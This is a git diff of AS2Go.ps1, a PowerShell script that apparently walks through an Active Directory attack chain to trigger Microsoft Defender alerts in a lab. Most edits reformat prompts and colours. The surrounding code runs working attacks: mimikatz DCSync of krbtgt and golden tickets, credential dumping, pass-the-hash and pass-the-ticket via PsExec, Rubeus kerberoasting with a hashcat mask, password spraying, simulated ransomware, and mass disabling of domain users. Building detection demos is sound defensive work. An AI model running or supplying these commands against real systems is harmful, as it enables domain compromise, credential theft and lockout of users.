@@ -20,8 +20,8 @@ My goal is to create expressive and representative Microsoft Defender for Endpoi
 
 .NOTES
 
-last update: 2022-11-13
-File Name  : AS2Go.ps1 | Version 2.5.9
+last update: 2022-12-01
+File Name  : AS2Go.ps1 | Version 2.6.0
 Author     : Holger Zimmermann | me@mrhozi.com | @HerrHozi
 
 
@@ -92,28 +92,26 @@ $path = Get-Location
 $scriptName = $MyInvocation.MyCommand.Name
 $scriptLog = "$path\$scriptName.log"
 $configFile = "$path\AS2Go.xml"
-$tmp = "$path\AS2Go.tmp"
 $exfiltration = "$path\Exfiltration"
 $exit = "x"
 $yes = "Y"
 $no = "N"
 $PtH = "H"
 $PtT = "T"
-$debug = "D"
 $GoldenTicket = "GT"
 $InitialStart = "Start"
 $PrivledgeAccount = $no
 
-
+$tmp = "$path\AS2Go.tmp"
+#$debug = "D"
 $RUBEUS = "Rubeus.exe"
-
-
 
 $stage00 = "COMPROMISED User Account"
 $stage05 = "BRUCE FORCE or PW SPRAY"
 $stage10 = "RECONNAISSANCE"
 $stage20 = "LATERAL MOVEMENT"
 $stage25 = "Steal or Forge Authentication Certificates"
+$stage27 = "Kerberoasting Attack"
 $stage30 = "ACCESS SENSITIVE DATA"
 $stage40 = "DOMAIN COMPROMISED"
 $stage50 = "COMPLETE"
@@ -132,19 +130,11 @@ $global:BDCred = ""
 $fgcS = "DarkGray" # Switch
 $fgcC = "Yellow"   # Command
 $fgcV = "DarkCyan" # Value
+[string] $fgcF = (get-host).ui.rawui.ForegroundColor
+If ($fgcF-eq "-1") {$fgcF = "White"}
 
 
-
-
-
-
-
-
-
-
-
-$WinVersion = [System.Environment]::OSVersion.Version
-
+$WinVersion = [System.Environment]::OSVersion.Version.ToString()
 
 $GroupDA  = (Get-ADGroup -Filter * -Properties * | Where-Object { ($_.SID -like "*-512") }).name
 $GroupEA  = (Get-ADGroup -Filter * -Properties * | Where-Object { ($_.SID -like "*-519") }).name
@@ -315,7 +305,7 @@ function Start-ConvertingToPfxFromPem {
     Start-Process -filePath $StartOpenSSL
     
     Write-Host "Next steps:" -ForegroundColor Yellow
-    Write-Host "---------- " -ForegroundColor Yellow
+    Write-Host "-----------" -ForegroundColor Yellow
     Write-Host " - Change to console "  -NoNewline; Write-Host "Win64 OpenSSL Command Prompt" -ForegroundColor Yellow
     Write-Host " - Change directory to C:\temp\AS2GO"
     Write-Host " - Paste the command into the OpenSSL Command Prompt"
@@ -367,7 +357,7 @@ function Start-RequestingCertificate {
     Write-Host ""
     Write-Log -Message "     >> .\certify.exe request /ca:$myEntCA /template:$CAtemplate /altname:$altname"
 
-    $question = "`nDo you want to run this step - Y or N? Default "
+    $question = "Do you want to run this step - Y or N? Default "
     $answer = Get-Answer -question $question -defaultValue $yes
 
     If ($answer -eq $yes) {
@@ -432,7 +422,7 @@ function Get-VulnerableCertificateTemplate {
     Write-Host ""
     Write-log -Message "     .\certify.exe find /vulnerable"
     
-    $question = "`nDo you want to run this step - Y or N? Default "
+    $question = "Do you want to run this step - Y or N? Default "
     $answer = Get-Answer -question $question -defaultValue $no
 
     If ($answer -eq $yes) {
@@ -442,7 +432,7 @@ function Get-VulnerableCertificateTemplate {
     }
 
     Do {
-        $question = "`nDo you want to use CA template '$CAtemplate' - Y or N? Default "
+        $question = "Do you want to use CA template '$CAtemplate' - Y or N? Default "
         $prompt = Get-Answer -question $question -defaultValue $yes
 
         if ($prompt -ne $yes) {
@@ -484,7 +474,7 @@ function Get-EnterpriseCAName {
     $temp = $MyCAConfig[7].Split([char]0x0060).Split([char]0x0027).Split([char]0x0022)
     $myEntCA = $temp[1]
 
-    $question = "`n -> Enter or confirm the Enterprise Certification Authority! Default "
+    $question = " -> Enter or confirm the Enterprise Certification Authority! Default "
     $answer = Get-Answer -question $question -defaultValue $myEntCA
     Set-KeyValue -key "EnterpriseCA" -NewValue $answer
 
@@ -521,12 +511,12 @@ function Start-KerberoastingAttack {
 
     # example: .\Rubeus.exe kerberoast /domain:SANDBOX.CORP /outfile:.\SANDBOX.CORP.hashes.txt
     Write-Host      -NoNewline "  Command: "
-    Write-Highlight -Text ".\Rubeus.exe ", "kerberoast /domain:", $myDomain, " /outfile:.\", $hashes `
-                    -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV
+    Write-Highlight -Text ".\Rubeus.exe ", "kerberoast ","/domain:", $myDomain, " /outfile:.\", $hashes `
+                    -Color $fgcC, $fgcF, $fgcS, $fgcV, $fgcS, $fgcV
 
     Write-Log -Message "     >> .\$RUBEUS kerberoast /domain:$myDomain /outfile:.\$hashes"
  
-    $question = "`nDo you want to run this step - Y or N? Default "
+    $question = "Do you want to run this step - Y or N? Default "
     $answer = Get-Answer -question $question -defaultValue $No
 
     If ($answer -eq $yes) {   
@@ -539,13 +529,14 @@ function Start-KerberoastingAttack {
         Write-Host "`n"
         write-host "The next step is " -NoNewline; write-host "cracking" -NoNewline -ForegroundColor Yellow 
         Write-host " the roasted hashes. HASHCAT is a good tool." 
-        Write-host "Let’s use the example where you know the password policy for the password; known as Brute-force or mask attack."
+        Write-host "Let’s use the example where you know the password policy for the password;" 
+        Write-host "Known as Brute-force or mask attack."
         Write-Host "The cracking mode for TGS-REP hashes is 13100.`n"
         
         # example: .\hashcat.exe -a 3 -m 13000 ./SANDBOX.CORP.hashes.txt ?u?l?l?l?l?l?d?d
         Write-Host      -NoNewline "  Example: "
         Write-Highlight -Text ".\hashcat.exe ", "-a ","3"," -m ", "13000 ", "./$hashes ", "?u?l?l?l?l?l?d?d" `
-                        -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcV, $fgcV
+                        -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcV, $fgcF
         Write-Host "`n"
         pause
     }
@@ -604,7 +595,7 @@ function New-PasswordSprayAttack {
 
 
     Do {
-        $question = "`nDo you like to use this password '$MyPW01' for the 1st spray - Y or N? Default "
+        $question = "Do you like to use this password '$MyPW01' for the 1st spray - Y or N? Default "
         $prompt = Get-Answer -question $question -defaultValue $yes
 
         if ($prompt -ne $yes) {
@@ -615,7 +606,7 @@ function New-PasswordSprayAttack {
 
 
     Do {
-        $question = "`nDo you like to use this password '$MyPW02' for the 2nd spray - Y or N? Default "
+        $question = "Do you like to use this password '$MyPW02' for the 2nd spray - Y or N? Default "
         $prompt = Get-Answer -question $question -defaultValue $yes
 
         if ($prompt -ne $yes) {
@@ -650,11 +641,11 @@ function New-PasswordSprayAttack {
         Write-Host " with Password: " -NoNewline; Write-Host $MyPW01 -ForegroundColor Yellow
     }
 
-    $question = "`nDo you also want to run a Password Spray attack with rubues.exe - Y or N? Default "
+    $question = "Do you also want to run a Password Spray attack with rubues.exe - Y or N? Default "
     $prompt = Get-Answer -question $question -defaultValue $no
 
     if ($prompt -eq $yes) {
-        $question = "`nDo you like to use this password '$MyPW03' for the spray with Rubeus - Y or N? Default "
+        $question = "Do you like to use this password '$MyPW03' for the spray with Rubeus - Y or N? Default "
         $prompt = Get-Answer -question $question -defaultValue $yes
 
         if ($prompt -ne $yes) {
@@ -774,7 +765,7 @@ function SimulateRansomare {
     Write-Host "`n Content from file $FolderToEncrypt\$filePrefix.txt before encryption"
 
 
-    $question = "`nDo you REALLY want to run this step - Y or N? Default "
+    $question = "Do you REALLY want to run this step - Y or N? Default "
     $answer = Get-Answer -question $question -defaultValue $no
 
     If ($answer -eq $yes) {
@@ -803,7 +794,7 @@ function Get-DirContent {
     Write-Log -Message "### Start Function $myfunction ###"
     #region ################## main code | out- host #####################
     Write-Host -NoNewline "  Command: "
-    Write-Highlight -Text ("Get-ChildItem ","-Path ", $Path, " -Directory") -Color $fgcC, $fgcS, $fgcV,$fgcC
+    Write-Highlight -Text ("Get-ChildItem ","-Path ", $Path, " -Directory") -Color $fgcC, $fgcS, $fgcV,$fgcS
     #Write-Host "Get-ChildItem -Path $Path -Directory" -ForegroundColor $global:FGCCommand
 
     Try {
@@ -883,7 +874,7 @@ Write-Highlight -Text ".\mimikatz.exe ", """log .\", $sFakeUser, ".log",""" ""ls
 
 #    Write-Host "mimikatz.exe ""log .\$sFakeUser.log"" ""lsadump::dcsync /domain:$fqdn /user:krbtgt""  ""exit""`n" -ForegroundColor $global:FGCCommand
         
-    $question = "`nDo you want to run this step - Y or N? Default "
+    $question = "Do you want to run this step - Y or N? Default "
     $answer = Get-Answer -question $question -defaultValue $Yes
     If ($answer -eq $yes) {
         Invoke-Command -ScriptBlock { .\mimikatz.exe "log .\$sFakeUser.log" "lsadump::dcsync /domain:$fqdn /user:krbtgt"  "exit" }
@@ -905,7 +896,7 @@ Write-Highlight -Text ".\mimikatz.exe ", """log .\", $sFakeUser, ".log",""" ""ls
         Write-Host "____________________________________________________________________`n"     
         
         
-        $question = "`n -> Is this NTLH HASH '$krbtgtntml'  for 'krbtgt'  correct - Y or N? Default "
+        $question = " -> Is this NTLH HASH '$krbtgtntml'  for 'krbtgt'  correct - Y or N? Default "
         $prompt = Get-Answer -question $question -defaultValue $yes
     
         if ($prompt -ne $yes) {
@@ -936,7 +927,7 @@ Write-Highlight -Text ".\mimikatz.exe ", """privilege::debug"" ""kerberos::purge
     #Write-Host "`n NEXT STEP: " -NoNewline
     #Write-Host "mimikatz.exe ""privilege::debug"" ""kerberos::purge"" ""kerberos::golden /domain:$fqdn /sid:$domainsID /rc4:$krbtgtntml /user:$sFakeUser /id:500 /groups:500,501,513,512,520,518,519 /ptt""  ""exit""`n" -ForegroundColor $global:FGCCommand
         
-    $question = "`nDo you want to run this step - Y or N? Default "
+    $question = "Do you want to run this step - Y or N? Default "
     $answer = Get-Answer -question $question -defaultValue $Yes
         
     If ($answer -eq $yes) {
@@ -1093,7 +1084,7 @@ function Start-UserManipulation {
     Write-Host "`n NEXT STEP: " -NoNewline
     Write-Host "get-aduser -filter * -SearchBase $MySearchBase | Disable-ADAccount`n" -ForegroundColor $FGCCommand
 
-    $question = "`nDo you want to disable all $count users  - Y or N? Default "
+    $question = "Do you want to disable all $count users  - Y or N? Default "
     $answer = Get-Answer -question $question -defaultValue $Yes
 
     If ($answer -eq $yes) {
@@ -1132,7 +1123,7 @@ function Start-UserManipulation {
     Write-Host "`n NEXT STEP: " -NoNewline
     Write-Host "Get-aduser | Set-ADAccountPassword -Reset -NewPassword $newRandomPW`n" -ForegroundColor $FGCCommand
 
-    $question = "`nDo you also want to reset the user's password with the random password '$newRandomPW' - Y or N? Default "
+    $question = "Do you also want to reset the user's password with the random password '$newRandomPW' - Y or N? Default "
     $answer = Get-Answer -question $question -defaultValue $Yes
 
     If ($answer -eq $yes) {
@@ -1498,23 +1489,31 @@ Set-NewBackgroundColor -BgC "Blue" -FgC "White"
 
 Function Get-Answer {
 
-    [CmdletBinding()]
-    Param(
-        [Parameter(Mandatory = $True)]
-        [string]
-        $question,
+    ################################################################################
+    #####                                                                      ##### 
+    #####    Description                                                       #####                                 
+    #####                                                                      #####
+    ################################################################################
 
-        [Parameter(Mandatory = $False)]
-        [string]
-        $defaultValue
-    )
+    Param([string] $question, [string] $defaultValue)
 
+    $myfunction = Get-FunctionName
+    Write-Log -Message "### Start Function $myfunction ###"
+    #region ################## main code | out- host #####################
 
-    write-host $question  -ForegroundColor $global:FGCQuestion -NoNewline
+    write-host "`n  $question"  -ForegroundColor $global:FGCQuestion -NoNewline
     $prompt = Read-Host "[$($defaultValue)]" 
     if ($prompt -eq "") { $prompt = $defaultValue } 
+
+    Write-Log -Message "Q:$question  A:$prompt"
+    #endregion ####################### main code #########################
+    Write-Log -Message "### End Function $myfunction ###"
+
     return $prompt.ToUpper()
 }
+
+
+
 
 Function Get-KeyValue {
 
@@ -1688,12 +1687,12 @@ function Get-AS2GoSettings {
         }
 
 
-        $question = "`n -> Are these values correct - Y or N? Default "
+        $question = " -> Are these values correct - Y or N? Default "
         $prompt = Get-Answer -question $question -defaultValue $yes
 
         if ($prompt -ne $yes) {
             $counter = 10
-            $question = "`n -> Please enter the desired setting number. Default "
+            $question = " -> Please enter the desired setting number. Default "
             $counter = Get-Answer -question $question -defaultValue $counter
 
             try {
@@ -1714,7 +1713,7 @@ function Get-AS2GoSettings {
 
 
         # End "Do ... Until" Loop?
-        $question = "`nDo you need to update more settings - Y or N? Default "
+        $question = "Do you need to update more settings - Y or N? Default "
         $repeat = Get-Answer -question $question -defaultValue $no
 
         If ($skipstep) { break }   
@@ -1883,13 +1882,12 @@ function Start-PtH-Attack {
     Write-Host "  Try to list all recently logged-on user credentials from VictimPC          " 
     Write-Host "____________________________________________________________________`n" 
     Write-Host ""
-
-
     $logfile = "$helpdeskuser.log"
-    Write-host "`nNext Step: " -NoNewline
-    write-host ".\mimikatz.exe ""log .\$logfile"" ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit""" -ForegroundColor $global:FGCCommand
-
-    $question = "`nDo you want to run this step - Y or N? Default "
+    Write-Host      -NoNewline "  Command: "
+    Write-Highlight -Text ".\mimikatz.exe ", """log .\", $logfile, """ ""privilege::","debug", """ ""sekurlsa::","logonpasswords", """ ""exit"""   `
+                    -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS
+    Write-Host ""
+    $question = "Do you want to run this step - Y or N? Default "
     $answer = Get-Answer -question $question -defaultValue $Yes
 
     If ($answer -eq $yes) {
@@ -1909,16 +1907,21 @@ function Start-PtH-Attack {
         Write-Host "                   overpass-the-Hash 'PtH' attack                   "
         Write-Host "____________________________________________________________________`n" 
         Write-Host ""
-        Write-Host "Compromised User Account - $helpdeskuser" -ForegroundColor $global:FGCHighLight
-        Write-Host "NTML Hash                - $pthntml"      -ForegroundColor $global:FGCHighLight
+        Write-Host "  Compromised User Account - " -NoNewline; Write-Host $helpdeskuser -ForegroundColor $global:FGCHighLight
+        Write-Host "  NTML Hash                - " -NoNewline; Write-Host $pthntml      -ForegroundColor $global:FGCHighLight
 
-        $question = "`nAre these values correct - Y or N? Default "
+        Write-Host      -NoNewline "  Command: "
+        Write-Highlight -Text ".\mimikatz.exe ", """privilege::","debug", """ ""sekurlsa::","pth", " /user:", $helpdeskuser , " /ntlm:", $pthntml, " /domain:", $fqdn,""" ""exit"""   `
+                        -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS
+        Write-Host ""
+        Write-Host ""
+        $question = "Are these values correct - Y or N? Default "
         $prompt = Get-Answer -question $question -defaultValue $yes
     
         if ($prompt -ne $yes) 
         {
 
-            $question = "`n -> Is this user $helpdeskuser  correct - Y or N? Default "
+            $question = " -> Is this user $helpdeskuser  correct - Y or N? Default "
             $prompt = Get-Answer -question $question -defaultValue $yes
     
             if ($prompt -ne $yes) {
@@ -1926,7 +1929,7 @@ function Start-PtH-Attack {
             }
  
   
-            $question = "`n -> Is this NTLH HASH for $helpdeskuser  correct - Y or N? Default "
+            $question = " -> Is this NTLH HASH for $helpdeskuser  correct - Y or N? Default "
             $prompt = Get-Answer -question $question -defaultValue $yes
     
             if ($prompt -ne $yes) {
@@ -1943,28 +1946,22 @@ function Start-PtH-Attack {
     Invoke-Command -ScriptBlock { .\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:$helpdeskuser /ntlm:$pthntml /domain:$fqdn" "exit" }
 
 
-    Write-Host "____________________________________________________________________`n"  -ForegroundColor Red
-    Write-Host "     #            use                                         #     " -ForegroundColor Red
-    Write-Host "     #                the                                     #     " -ForegroundColor Red
-    Write-Host "     #                    new                                 #     " -ForegroundColor Red
-    Write-Host "     #                        DOS                             #     " -ForegroundColor Red
-    Write-Host "     #                            window                      #     " -ForegroundColor Red
-    Write-Host "____________________________________________________________________`n"  -ForegroundColor Red
-
-
+    Write-Host "____________________________________________________________________`n" -ForegroundColor Red
+    Write-Host "     #            use                                         #     "   -ForegroundColor Red
+    Write-Host "     #                the                                     #     "   -ForegroundColor Red
+    Write-Host "     #                    new                                 #     "   -ForegroundColor Red
+    Write-Host "     #                        DOS                             #     "   -ForegroundColor Red
+    Write-Host "     #                            window                      #     "   -ForegroundColor Red
+    Write-Host "____________________________________________________________________`n" -ForegroundColor Red
 
 
     Write-Host "`n`nPlease run the following command from the new Terminal Window:`n" -ForegroundColor $global:FGCQuestion
     Write-Host "00.cmd" -ForegroundColor $global:FGCCommand
 
-
-
-
     Set-KeyValue -key "LastStage" -NewValue $stage20
 
     Stop-Process -ErrorAction SilentlyContinue -Name iexplore -Force 
     Stop-Process -ErrorAction SilentlyContinue -Name msedge -Force 
-
 
     #####
     Write-Log -Message "### End Function $myfunction ###"
@@ -1985,7 +1982,7 @@ function Start-PtT-Attack {
     Write-Host "      Step #1 - stage mimikatz on Admin PC"
     Write-Host "      Step #2 - harvest tickets on Admin PC"
     Write-Host "      Step #3 - run PtT to become Domain Admin"
-
+    Write-host ""
     Pause
     Clear-Host
     # remove all old tickets
@@ -2005,18 +2002,16 @@ function Start-PtT-Attack {
     Write-Host "____________________________________________________________________`n" 
     write-host ""
 
+    Write-Host      -NoNewline "  Command: "
+    Write-Highlight -Text "Copy-Item ", "-Path ", ".\mimikatz.exe ", " -Destination ", "\\$mySAW\$ticketsUNCPath", " -Recurse"   `
+                    -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS
+    Write-Host  ""
     #cleanup
     Remove-Item -Recurse \\$mySAW\$ticketsUNCPath -ErrorAction Ignore
-    New-Item \\$mySAW\$ticketsUNCPath -ItemType directory -ErrorAction Ignore
-
-    Write-Host ".\mimikatz.exe -Destination \\$mySAW\$ticketsUNCPath -Recurse`n" -ForegroundColor $global:FGCCommand
+    New-Item \\$mySAW\$ticketsUNCPath -ItemType directory -ErrorAction Ignore | Out-Null
     Copy-Item -Path ".\mimikatz.exe" -Destination \\$mySAW\$ticketsUNCPath -Recurse
-
-
-    #workaround
     $files = "\\$mySAW\$ticketsUNCPath\*.exe"
-    #Write-Host "Get-Item $files | Write-Output`n" -ForegroundColor $global:FGCCommand
-    Get-Item $files | Write-Output
+    Get-Item $files | Out-Host
 
     Pause
 
@@ -2024,16 +2019,12 @@ function Start-PtT-Attack {
     Write-Host "____________________________________________________________________`n" 
     Write-Host "           harvest tickets on Admin PC $mySAW                      "
     Write-Host "____________________________________________________________________`n" 
-    write-host ""
-    write-host ""
-    write-host "PsExec.exe \\$mySAW -accepteula cmd /c (cd c:\temp\tickets & mimikatz.exe ""privilege::debug"" ""sekurlsa::tickets /export""  ""exit"")" -ForegroundColor $global:FGCCommand
-    write-host ""
-    write-host ""
-
+    Write-Host      -NoNewline "  Command: "
+    Write-Highlight -Text "PsExec.exe ", "\\$mySAW ", "-accepteula ", "cmd /c ", "('cd c:\temp\tickets & mimikatz.exe ""privilege::debug"" ""sekurlsa::tickets /export""  ""exit""')"  `
+                    -Color $fgcC, $fgcV, $fgcS, $fgcC, $fgcV
+    Write-Host  ""
     Invoke-Command -ScriptBlock { .\PsExec.exe \\$mySAW -accepteula cmd /c ('cd c:\temp\tickets & mimikatz.exe "privilege::debug" "sekurlsa::tickets /export"  "exit"') }
     Pause
-
-
 
     Clear-Host
     Write-Host "____________________________________________________________________`n" 
@@ -2042,18 +2033,16 @@ function Start-PtT-Attack {
     write-host ""
 
     $files = "\\$mySAW\$ticketsUNCPath\*.kirbi"
-    #Write-Host "Get-Item $files | Write-Output" -ForegroundColor $global:FGCCommand
 
+    Write-Host      -NoNewline "  Command: "
+    Write-Highlight -Text "Get-Item ", $files, " -Force ", "| Out-Host "  `
+                    -Color $fgcC, $fgcV, $fgcS, $fgcC
+    Write-Host  ""
 
-    $test = Get-Item $files -Force
-    Write-Host
-    Write-Output $test
-
-    #Get-Content -Path $tmp
-
+    Get-Item $files -Force | Out-Host
     Pause
-    Clear-Host
 
+    Clear-Host
     Write-Host "____________________________________________________________________`n" 
     Write-Host "  copy $domainadmin tickets from Admin PC '$mySAW' to Victim PC "
     Write-Host "____________________________________________________________________`n" 
@@ -2061,10 +2050,8 @@ function Start-PtT-Attack {
     New-Item \\$hostname\$ticketsUNCPath -ItemType directory -ErrorAction Ignore
     Get-Item \\$mySAW\$ticketsUNCPath\*$domainadmin* | Copy-Item -Destination \\$hostname\$ticketsUNCPath
 
-
     $files = "\\$hostname\$ticketsUNCPath\*.kirbi"
-    #Write-Host "Get-Item $files | Write-Output" -ForegroundColor $global:FGCCommand
-    Get-Item $files | Write-Output
+    Get-Item $files | Out-Host
 
     Pause
     Remove-Item -Recurse \\$mySAW\$ticketsUNCPath
@@ -2073,8 +2060,12 @@ function Start-PtT-Attack {
     write-host "     load stolen tickets from $domainadmin on VictimPC"
     write-host "                    to become a Domain Admin"
     Write-Host "____________________________________________________________________`n" 
-    write-host ""
-    write-host ".\mimikatz.exe ""privilege::debug"" ""kerberos::ptt \\$hostname\$ticketsUNCPath"" ""exit""" -ForegroundColor $global:FGCCommand 
+    Write-Host  ""
+    Write-Host      -NoNewline "  Command: "
+    Write-Highlight -Text ".\mimikatz.exe ", """privilege::debug"" ""kerberos::ptt", " \\$hostname\$ticketsUNCPath", """ ""exit"""   `
+                    -Color $fgcC, $fgcS, $fgcV, $fgcS
+    Write-Host  ""
+
     Pause
     Clear-Host
     Invoke-Command -ScriptBlock { .\mimikatz.exe "privilege::debug" "kerberos::ptt \\$hostname\$ticketsUNCPath" "exit" }
@@ -2083,6 +2074,11 @@ function Start-PtT-Attack {
     Write-Host "____________________________________________________________________`n" 
     Write-Host "       Displays a list of currently cached Kerberos tickets         "
     Write-Host "____________________________________________________________________`n" 
+    Write-Host  ""
+    Write-Host      -NoNewline "  Command: "
+    Write-Highlight -Text "klist" `
+                    -Color $fgcC
+    Write-Host  ""
     Pause
     write-host ""
     Set-KeyValue -key "LastStage" -NewValue $PtT
@@ -2095,22 +2091,20 @@ function Start-PtT-Attack {
     Write-Host "____________________________________________________________________`n" 
     write-host ""
 
-    #Access-Directory -directory "\\$mydc\c$\*.*"
-    #workaround
     $directory = "\\$myDC\c$"
     Get-DirContent -Path $directory
-
-
-
     Pause
+
     Clear-Host
     Write-Host "____________________________________________________________________`n" 
     Write-Host "        2nd TRY to list NetBIOS sessions on Domain Controller       "
     Write-Host "____________________________________________________________________`n" 
     write-host ""
-    write-host " NetSess.exe $mydc"
-    write-host ""
-    write-host ""
+    Write-Host      -NoNewline "  Command: "
+    Write-Highlight -Text ".\NetSess.exe ","$mydc" `
+                    -Color $fgcC,$fgcV
+    Write-Host  ""
+
 
     Start-NetSess -server $mydc
     Pause
@@ -2133,9 +2127,6 @@ function Start-NetSess {
     #####
 
     Invoke-Command -ScriptBlock { .\NetSess.exe $server }
-
-
-
     #####
     Write-Log -Message "### End Function $myfunction ###"
 }
@@ -2208,8 +2199,9 @@ function Start-Reconnaissance-Part2 {
     Write-Host "TRY to enumerate the members of the Group Policy Creator Owners group         "
     Write-Host "____________________________________________________________________`n" 
 
-    Write-Host -NoNewline "  Command: "
-    Write-Highlight -Text ("Get-ADGroupMember ", "-Identity ","'Group Policy Creator Owners' ", "-Recursive | ", "FT") -Color $fgcC, $fgcS, $fgcV, $fgcC, $fgcS
+    Write-Host      -NoNewline "  Command: "
+    Write-Highlight -Text ("Get-ADGroupMember ", "-Identity ","'Group Policy Creator Owners' ", "-Recursive | ", "FT") `
+                    -Color $fgcC, $fgcS, $fgcV, $fgcC, $fgcS
     #Write-Host " Get-ADGroupMember -Identity 'Group Policy Creator Owners' -Recursive | ft" -ForegroundColor $global:FGCCommand
     Write-Host ""
     Get-SensitveADUser -group "Group Policy Creator Owners"
@@ -2221,8 +2213,9 @@ function Start-Reconnaissance-Part2 {
     Write-Host "            TRY to enumerate all Enterprise Admins              "
     Write-Host "____________________________________________________________________`n" 
     
-    Write-Host -NoNewline "  Command: "
-    Write-Highlight -Text ("Get-ADGroupMember ", "-Identity ","'Group Policy Creator Owners' ", "-Recursive | ", "FT") -Color $fgcC, $fgcS, $fgcV, $fgcC, $fgcS
+    Write-Host      -NoNewline "  Command: "
+    Write-Highlight -Text ("Get-ADGroupMember ", "-Identity ","'Group Policy Creator Owners' ", "-Recursive | ", "FT") `
+                    -Color $fgcC, $fgcS, $fgcV, $fgcC, $fgcS
     
     #Write-Host " Get-ADGroupMember -Identity 'Enterprise Admins' -Recursive | ft" -ForegroundColor $global:FGCCommand
     Write-Host ""
@@ -2233,9 +2226,11 @@ function Start-Reconnaissance-Part2 {
     Write-Host "____________________________________________________________________`n" 
     Write-Host "            open new window for Domain Zone Transfer                "
     Write-Host "____________________________________________________________________`n" 
-    Write-Host " use command: ls -d $fqdn" -ForegroundColor $global:FGCCommand
-    Write-Host ""
-    Write-Host ""
+    write-host ""
+    Write-Host      -NoNewline "  Command: "
+    Write-Highlight -Text "nslookup | ", "ls ","-d ", "$fqdn" `
+                    -Color $fgcC, $fgcC, $fgcS, $fgcV
+    Write-Host  ""
 
     try {
         Write-Output "ls -d $fqdn" | Set-Clipboard
@@ -2252,7 +2247,10 @@ function Start-Reconnaissance-Part2 {
     Write-Host "          TRY to list NetBIOS sessions on Domain Controller         "
     Write-Host "____________________________________________________________________`n" 
     Write-Host ""
-    Write-Host ".\NetSess.exe $mydc" -ForegroundColor $global:FGCCommand
+    Write-Host      -NoNewline "  Command: "
+    Write-Highlight -Text ".\NetSess.exe ","$mydc" `
+                    -Color $fgcC,$fgcV
+    Write-Host  ""
     Write-Host ""
     Start-NetSess -server $mydc
     Write-Host ""
@@ -2433,7 +2431,7 @@ Function Start-AS2GoDemo {
         $StartValue = $no
     } 
 
-    $question = "`nStarts the attack scenario from the beginning? Default "
+    $question = "Starts the attack scenario from the beginning? Default "
     $Begin = Get-Answer -question $question -defaultValue $StartValue
 
     If ($Begin -eq $yes)
@@ -2525,7 +2523,7 @@ Function Start-AS2GoDemo {
             Write-Host "           ... in this case, we run a Password Spray Attack ...         "
             Write-Host "____________________________________________________________________`n" 
 
-            $question = "`nDo you want to run this step - Y or N? Default "
+            $question = "Do you want to run this step - Y or N? Default "
             $answer = Get-Answer -question $question -defaultValue $No
 
             If ($answer -eq $yes) {
@@ -2546,7 +2544,7 @@ Function Start-AS2GoDemo {
             Write-Host "____________________________________________________________________`n" 
 
             # End "Do ... Until" Loop?
-            $question = "`nDo you need to REPEAT this attack level - Y or N? Default "
+            $question = "Do you need to REPEAT this attack level - Y or N? Default "
             $repeat = Get-Answer -question $question -defaultValue $no
    
         } Until ($repeat -eq $no)
@@ -2607,7 +2605,7 @@ Function Start-AS2GoDemo {
     $victim = $env:UserName
     $suffix = $victim.Substring(3)
 
-    $question = "`n -> Enter or confirm your account suffix! Default "
+    $question = " -> Enter or confirm your account suffix! Default "
     $suffix = Get-Answer -question $question -defaultValue $suffix
 
 
@@ -2625,7 +2623,7 @@ Function Start-AS2GoDemo {
 
     If ($Begin -eq $yes) {
         Write-Host ""
-        Write-Host "  Victim Maschine           --  $myViPC"
+        Write-Host "  Victim Maschine           --  $myViPC - Version $WinVersion"
         Write-Host "  Admin Maschine            --  $mySAW" 
         Write-Host "  Domain Controller         --  $myDC" 
    
@@ -2687,7 +2685,7 @@ Function Start-AS2GoDemo {
         Write-Host "                Was this a PRIVLEDGE(!) Account?                    "
         Write-Host "____________________________________________________________________`n" 
 
-        $question = "`n -> Enter [Y] to confirm or [N] for a non-sensitive user! Default "
+        $question = " -> Enter [Y] to confirm or [N] for a non-sensitive user! Default "
         $answer = Get-Answer -question $question -defaultValue $PrivledgeAccount
 
 
@@ -2729,7 +2727,7 @@ Function Start-AS2GoDemo {
         Write-Highlight -Text ("Get-ADUser ", "-Identity ","$victim") -Color $fgcC, $fgcS, $fgcV
   
 
-        $question = "`nDo you want to run this step - Y or N? Default "
+        $question = "Do you want to run this step - Y or N? Default "
         If ($skipstep) 
         {
             $answer = Get-Answer -question $question -defaultValue $No
@@ -2793,7 +2791,7 @@ Function Start-AS2GoDemo {
        
 
         # End "Do ... Until" Loop?
-        $question = "`nDo you need to REPEAT this attack level - Y or N? Default "
+        $question = "Do you need to REPEAT this attack level - Y or N? Default "
         $repeat = Get-Answer -question $question -defaultValue $no
    
     } Until ($repeat -eq $no)
@@ -2819,7 +2817,7 @@ Function Start-AS2GoDemo {
         Write-Host "       try to collect reconnaissance and configuration data         "
         Write-Host "____________________________________________________________________`n" 
 
-        $question = "`nDo you want to run this step - Y or N? Default "
+        $question = "Do you want to run this step - Y or N? Default "
         $answer = Get-Answer -question $question -defaultValue $Yes
 
         If ($answer -eq $yes) {
@@ -2828,7 +2826,7 @@ Function Start-AS2GoDemo {
     
             Start-Reconnaissance-Part1
 
-            $question = "`nFurther reconnaissance tasks - Y or N? Default "
+            $question = "Further reconnaissance tasks - Y or N? Default "
             $answer = Get-Answer -question $question -defaultValue $reconnaissance
 
             If ($answer -eq $yes) {
@@ -2849,7 +2847,7 @@ Function Start-AS2GoDemo {
         Write-Host "____________________________________________________________________`n" 
 
         # End "Do ... Until" Loop?
-        $question = "`nDo you need to REPEAT this attack level - Y or N? Default "
+        $question = "Do you need to REPEAT this attack level - Y or N? Default "
         $repeat = Get-Answer -question $question -defaultValue $no
    
     } Until ($repeat -eq $no)
@@ -2876,7 +2874,7 @@ Function Start-AS2GoDemo {
 
         Write-Host "Choose your Lateral Movement Technique!                 "
 
-        $question = "`nEnter [H] for Pass-the-Hash, [T] for Pass-the-Ticket, or [S] to skip this attack! Default "
+        $question = "Enter [H] for Pass-the-Hash, [T] for Pass-the-Ticket, or [S] to skip this attack! Default "
         $answer = Get-Answer -question $question -defaultValue $LateralMovement
 
         If ($answer -eq $PtH)
@@ -2902,7 +2900,7 @@ Function Start-AS2GoDemo {
         Write-Host "____________________________________________________________________`n" 
 
         # End "Do ... Until" Loop?
